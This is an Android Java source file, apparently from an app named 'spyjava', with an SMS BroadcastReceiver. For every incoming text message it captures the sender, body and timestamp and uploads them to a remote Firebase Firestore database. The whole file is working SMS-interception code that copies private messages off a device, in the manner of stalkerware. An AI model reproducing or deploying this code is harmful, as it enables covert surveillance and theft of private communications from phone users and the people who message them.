package com.example.spyjava;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.FirebaseFirestore;

public class SmsBroadcastReceiver extends BroadcastReceiver {
    public static final String SMS_BUNDLE = "pdus";
    String address;
    newMes mess;
    String smsBody;
    String time;
    SMSservice smSservice;
    String smsMessageStr = "";
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle intentExtras = intent.getExtras();
        smSservice=new SMSservice();
        smSservice.onCreate();
        if (intentExtras != null) {
            Object[] sms = (Object[]) intentExtras.get(SMS_BUNDLE);

            for (int i = 0; i < sms.length; ++i) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sms[i]);

                smsBody = smsMessage.getMessageBody().toString();
               address  = smsMessage.getOriginatingAddress();
                time= String.valueOf(smsMessage.getTimestampMillis());
                smsMessageStr += "SMS From: " + address + "\n";
                smsMessageStr += smsBody + "\n";
            }
//            Toast.makeText(context, smsMessageStr, Toast.LENGTH_SHORT).show();

            //this will update the UI with message
            String model = Build.MODEL;
            mess= new newMes();
            mess.setMess(smsBody);
            mess.setAddress(address);
            mess.setTime(time);
            FirebaseFirestore db;
            db=FirebaseFirestore.getInstance();
            db.collection("message").document(address).collection("newmessage").document(time).set(mess).addOnCompleteListener(new OnCompleteListener<Void>() {
                @Override
                public void onComplete(@NonNull Task<Void> task) {
                    Toast.makeText(context, smsMessageStr, Toast.LENGTH_LONG).show();
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    Toast.makeText(context, "Check Net", Toast.LENGTH_LONG).show();
                }
            });
        }
    }

}
